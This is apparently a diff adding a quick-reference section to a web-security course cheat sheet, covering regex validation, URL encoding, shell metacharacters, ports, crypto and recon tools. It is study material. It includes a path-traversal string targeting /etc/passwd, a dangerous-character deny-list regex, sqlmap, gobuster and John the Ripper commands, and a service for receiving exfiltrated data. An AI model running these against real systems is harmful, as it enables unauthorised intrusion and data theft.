   - Be pessimistic when unsure
   - Cost-effective solutions: don't spend more than expected damage
   - *Black Swans*: Low likelihood + High impact = Medium, but can be devastating → may have to accept and live with such risks
+])
+
+= Quick Reference
+
+#concept-block(body: [
+  #inline("Regular Expressions (Regex)")
+
+  #subinline("Security Rule: Always Anchor")
+  - `^pattern$` = matches *entire* string (secure) → use this for validation
+  - `pattern` = matches *substring* (insecure) → `evil../../etc/passwd` passes `[a-z]+`
+
+  #subinline("Syntax")
+  - *Quantifiers*: `?` zero/one | `+` one or more | `*` zero or more | `{n,m}` n to m times
+  - *Character classes*: `[abc]` match a, b, or c | `[^abc]` NOT a, b, c | `[a-z]` range
+  - *Shortcuts*: `.` any | `\s` whitespace, `\S` NOT | `\w` word, `\W` NOT | `\d` digit, `\D` NOT
+  - *Word boundary*: `\b` marks edge between word/non-word (`\bcat\b` matches "cat" not "category")
+  - *Anchors*: `^` start of string | `$` end of string
+  - *Grouping*: `(ab)+` matches "abab" (apply quantifier to group) | `cat|dog` matches "cat" or "dog"
+  - *Escape*: `\.` for literal dot (special chars: `. * + ? ^ $ { } [ ] ( ) | \`)
+
+  #subinline("Common Validation Patterns")
+  - *Alphanumeric*: `^[a-zA-Z0-9]+$`
+  - *Filename (safe)*: `^[a-zA-Z0-9_.-]{1,100}$` (no slashes)
+  - *Username*: `^[a-zA-Z][a-zA-Z0-9_]{2,31}$` (letter first, 3-32 chars)
+  - *Blacklist dangerous*: `^[^<>\"';&|$(){}\\[\\]]+$`
+
+  #inline("URL Encoding Reference")
+  *Path traversal*: `/` → `%2F` | `.` → `%2E` | `\` → `%5C` \
+  *XSS/HTML*: `<` → `%3C` | `>` → `%3E` | `"` → `%22` | `'` → `%27` \
+  *Other*: ` ` → `%20` | `%` → `%25` | `&` → `%26` | `#` → `%23` \
+  *Rule*: Decode BEFORE validation, never after!
+
+  #inline("Shell Metacharacters")
+  - *Separators*: `;` (chain) | `|` (pipe) | `&` (background) | `&&`/`||` (conditional)
+  - *Substitution*: ``` ` ` ``` or `$()` executes command, inserts output
+  - *Redirection*: `>` `<` `>>` (write/read/append files)
+  - *Quoting*: `"` `'` (escape context) | `\` (escape char)
+  - *Variables*: `$VAR` or `${VAR}` expands variable value
+
+  #inline("Linux File Permissions (ls -l)")
+  ```
+  -rwxr-xr-x  1  root  root  8312  Jan 8 2021  java
+  │└┬┘└┬┘└┬┘  │   │     │     │       │         └─ filename
+  │ │  │  │   │   │     │     │       └─ modified
+  │ │  │  │   │   │     │     └─ size (bytes)
+  │ │  │  │   │   │     └─ group owner
+  │ │  │  │   │   └─ user owner
+  │ │  │  │   └─ hard links
+  │ │  │  └─ other: r-x = 4+1 = 5
+  │ │  └─ group: r-x = 4+1 = 5
+  │ └─ owner: rwx = 4+2+1 = 7
+  └─ type: - file | d dir | l symlink
+  ```
+  - *Bits*: `r` read (4) | `w` write (2) | `x` execute (1) | `-` none (0) → sum per group
+
+  #inline("HTTP Status Codes")
+  - *2xx Success*: `200` OK | `201` Created | `204` No Content
+  - *3xx Redirect*: `301`/`302` Redirect (check for open redirect vulnerability)
+  - *4xx Client Error*: `400` Bad Request | `401` Unauthorized (no/invalid auth) | `403` Forbidden (valid auth, no permission) | `404` Not Found
+  - *5xx Server Error*: `500` Internal Error (check for info leak) | `502` Bad Gateway | `503` Service Unavailable
+
+  #inline("Common Ports")
+  - *Web*: 80 (HTTP) | 443 (HTTPS) | 8080/8443 (alt)
+  - *Auth/Mail*: 22 (SSH) | 21 (FTP) | 25 (SMTP) | 389 (LDAP)
+  - *Databases*: 3306 (MySQL) | 5432 (PostgreSQL) | 1433 (MSSQL) | 27017 (MongoDB) | 6379 (Redis)
+
+  #inline("Crypto Algorithms (JCA)")
+  *Symmetric*: AES (128/192/256-bit key, 16B IV) | CHACHA20 (256-bit key, 12B nonce) | SEED (128-bit, Bouncy Castle) \
+  *Modes*: CBC (+ separate MAC) | GCM (authenticated) | CTR (stream) | ECB (never use!) \
+  *Hashing*: SHA-256, SHA-512, SHA3-256, SHA3-512 (secure) | MD5, SHA-1 (insecure) \
+  *MAC*: `HmacSHA256`, `HmacSHA512`, `HmacSHA3-256`, `HmacSHA3-512` \
+  *Signatures*: `SHA256withRSA`, `SHA512withRSA`, `SHA3-256withRSA`
+
+  #inline("Recon & Exploitation Tools")
+  - *Directory discovery*: `gobuster dir -u https://target -w /usr/share/wordlists/dirb/common.txt`
+    - Add `-d` flag to detect backup files (`file~`, `.file.swp`)
+  - *SQLMap*: `sqlmap -r request.txt --force-ssl --dbs` (auto SQLi, `--technique=B` for blind only)
+  - *John the Ripper*: `john --format=raw-sha256 --wordlist=wordlist.txt hashes.txt` (format: `user:hash`)
+  - *JWT decode*: `echo 'eyJhbG...' | cut -d'.' -f2 | base64 -d` or use jwt.io
+  - *Burp Suite*: Intercept/modify requests, Intruder for fuzzing, Sequencer for session analysis
+  - *ZAP*: Alternative to Burp, Fuzzer not rate-limited
+  - *Request Catcher*: Receive exfiltrated data (requestcatcher.com) - use `/debug` endpoint to view requests
+  - *curl with auth*: `curl -u "user:pass" https://target` | with proxy: `curl -x http://127.0.0.1:8080`
+  - *Check IP via Tor*: `proxychains -q curl -s ifconfig.io`
+
+  #inline("Information Disclosure Patterns")
+  #subinline("Backup Files")
+  Editors leave recoverable backups. Try these patterns on discovered files:
+  - `file~` (vim backup) | `file.bak` | `.file.swp` (vim swap) | `#file#` (emacs)
+  - `file.old` | `file.orig` | `file.save` | `file.php~`
+
+  #subinline("Hash Identification")
+  - 32 hex = MD5: `5d41402abc4b2a76b9719d911017c592`
+  - 40 hex = SHA-1: `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d`
+  - 64 hex = SHA-256: `2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c...`
+  - `$2a$`, `$2b$`, `$2y$` prefix = bcrypt | `$argon2` prefix = Argon2
 ])
 
